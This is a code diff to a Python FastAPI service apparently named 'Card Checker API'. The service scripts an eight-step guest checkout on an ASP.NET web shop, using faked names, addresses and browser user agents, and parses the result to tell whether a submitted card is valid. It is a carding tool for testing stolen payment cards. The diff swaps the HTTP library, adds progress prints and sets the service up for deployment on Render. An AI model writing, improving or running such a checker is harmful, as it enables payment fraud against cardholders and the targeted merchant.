@@ -3,9 +3,10 @@ import asyncio
 from typing import Optional, Tuple
 from fastapi import FastAPI, HTTPException
 from pydantic import BaseModel
-from curl_cffi.requests import AsyncSession
+import httpx
 from fake_useragent import FakeUserAgent
 from faker import Faker
+import os
 
 app = FastAPI()
 
@@ -83,7 +84,7 @@ async def payflow(card: tuple):
     state = fake.state_abbr()
     postal_code = fake.postalcode()
 
-    async with AsyncSession() as session:
+    async with httpx.AsyncClient(timeout=30.0, follow_redirects=True) as session:
         try:
             # REQ 1
             resp = await session.post(
@@ -108,8 +109,9 @@ async def payflow(card: tuple):
                     "sizeOptions": "",
                 },
             )
-            if not resp.ok:
+            if resp.status_code != 200:
                 return {"status": "error", "message": f"ERROR IN REQUEST 1: {resp.status_code}."}
+            print("REQ 1 Done.")
         except Exception as e:
             return {"status": "error", "message": f"ERROR WHILE DOING REQUEST 1: {e}"}
 
@@ -127,12 +129,13 @@ async def payflow(card: tuple):
                     "user-agent": user_agent,
                 },
             )
-            if not resp.ok:
+            if resp.status_code != 200:
                 return {"status": "error", "message": f"ERROR IN REQUEST 2: {resp.status_code}."}
 
             viewstate = splitter(resp.text, 'id="__VIEWSTATE" value="', '"')
             viewstategenerator = splitter(resp.text, 'id="__VIEWSTATEGENERATOR" value="', '"')
             eventvalidation = splitter(resp.text, 'id="__EVENTVALIDATION" value="', '"')
+            print("REQ 2 Done.")
         except Exception as e:
             return {"status": "error", "message": f"ERROR WHILE DOING REQUEST 2: {e}"}
 
@@ -166,12 +169,13 @@ async def payflow(card: tuple):
                     "ctl00$PageContent$btnCheckout": "Checkout Now",
                 },
             )
-            if not resp.ok:
+            if resp.status_code != 200:
                 return {"status": "error", "message": f"ERROR IN REQUEST 3: {resp.status_code}."}
 
             viewstate = splitter(resp.text, 'id="__VIEWSTATE" value="', '"')
             viewstategenerator = splitter(resp.text, 'id="__VIEWSTATEGENERATOR" value="', '"')
             eventvalidation = splitter(resp.text, 'id="__EVENTVALIDATION" value="', '"')
+            print("REQ 3 Done.")
         except Exception as e:
             return {"status": "error", "message": f"ERROR WHILE DOING REQUEST 3: {e}"}
 
@@ -203,12 +207,13 @@ async def payflow(card: tuple):
                     "ctl00$PageContent$Skipregistration": "Checkout As Guest",
                 },
             )
-            if not resp.ok:
+            if resp.status_code != 200:
                 return {"status": "error", "message": f"ERROR IN REQUEST 4: {resp.status_code}."}
 
             viewstate = splitter(resp.text, 'id="__VIEWSTATE" value="', '"')
             viewstategenerator = splitter(resp.text, 'id="__VIEWSTATEGENERATOR" value="', '"')
             eventvalidation = splitter(resp.text, 'id="__EVENTVALIDATION" value="', '"')
+            print("REQ 4 Done.")
         except Exception as e:
             return {"status": "error", "message": f"ERROR WHILE DOING REQUEST 4: {e}"}
 
@@ -260,12 +265,13 @@ async def payflow(card: tuple):
                     "ctl00$PageContent$hidPagePlacement": "0",
                 },
             )
-            if not resp.ok:
+            if resp.status_code != 200:
                 return {"status": "error", "message": f"ERROR IN REQUEST 5: {resp.status_code}."}
 
             viewstate = splitter(resp.text, 'id="__VIEWSTATE" value="', '"')
             viewstategenerator = splitter(resp.text, 'id="__VIEWSTATEGENERATOR" value="', '"')
             eventvalidation = splitter(resp.text, 'id="__EVENTVALIDATION" value="', '"')
+            print("REQ 5 Done.")
         except Exception as e:
             return {"status": "error", "message": f"ERROR WHILE DOING REQUEST 5: {e}"}
 
@@ -297,12 +303,13 @@ async def payflow(card: tuple):
                     "ctl00$PageContent$OrderNotes": "",
                 },
             )
-            if not resp.ok:
+            if resp.status_code != 200:
                 return {"status": "error", "message": f"ERROR IN REQUEST 6: {resp.status_code}."}
 
             viewstate = splitter(resp.text, 'id="__VIEWSTATE" value="', '"')
             viewstategenerator = splitter(resp.text, 'id="__VIEWSTATEGENERATOR" value="', '"')
             eventvalidation = splitter(resp.text, 'id="__EVENTVALIDATION" value="', '"')
+            print("REQ 6 Done.")
         except Exception as e:
             return {"status": "error", "message": f"ERROR WHILE DOING REQUEST 6: {e}"}
 
@@ -342,12 +349,13 @@ async def payflow(card: tuple):
                     "ctl00$PageContent$btnContCheckout": "Continue Checkout",
                 },
             )
-            if not resp.ok:
+            if resp.status_code != 200:
                 return {"status": "error", "message": f"ERROR IN REQUEST 7: {resp.status_code}."}
 
             viewstate = splitter(resp.text, 'id="__VIEWSTATE" value="', '"')
             viewstategenerator = splitter(resp.text, 'id="__VIEWSTATEGENERATOR" value="', '"')
             eventvalidation = splitter(resp.text, 'id="__EVENTVALIDATION" value="', '"')
+            print("REQ 7 Done.")
         except Exception as e:
             return {"status": "error", "message": f"ERROR WHILE DOING REQUEST 7: {e}"}
 
@@ -376,7 +384,7 @@ async def payflow(card: tuple):
                     "ctl00$ctrlPageSearch$SearchText": "",
                 },
             )
-            if not resp.ok:
+            if resp.status_code != 200:
                 return {"status": "error", "message": f"ERROR IN REQUEST 8: {resp.status_code}."}
 
             error_msg = splitter(resp.text, '_ErrorMsgLabel" class="error">', "<")
@@ -409,6 +417,8 @@ async def check_card(request: CardRequest):
 async def root():
     return {"message": "Card Checker API is running"}
 
+# Para Render
 if __name__ == "__main__":
     import uvicorn
-    uvicorn.run(app, host="0.0.0.0", port=8000)
+    port = int(os.environ.get("PORT", 10000))
+    uvicorn.run(app, host="0.0.0.0", port=port)
